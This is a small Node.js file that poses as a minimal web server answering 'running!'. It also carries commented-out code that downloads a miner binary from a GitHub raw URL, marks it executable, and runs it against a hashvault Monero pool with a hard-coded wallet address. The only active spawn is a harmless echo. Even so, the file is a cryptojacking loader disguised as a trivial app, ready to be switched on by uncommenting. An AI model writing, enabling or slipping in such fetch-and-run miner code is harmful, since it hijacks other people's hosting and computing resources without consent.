const { spawn } = require("node:child_process");
const fs = require("fs");
const https = require("https");
const http = require("http");

// https.get("https://raw.githubusercontent.com/iceyfromdiscord/arm/refs/heads/main/xm-aarch", (res) => {
//   res.pipe(fs.createWriteStream("prog"));
// });

setTimeout(function(){
  // spawn("chmod +x prog", { shell: true, stdio: "inherit" });
  // spawn("./prog --url pool.hashvault.pro:443 --user 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ --pass main --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14", { shell: true });
  spawn("echo balls")
  // console.log("started!")
}, 2500);

const PORT = process.env.PORT || 3000;

http.createServer((req, res) => {
  res.end("running!");
}).listen(PORT, () => {
  console.log("listening on:", PORT);
});
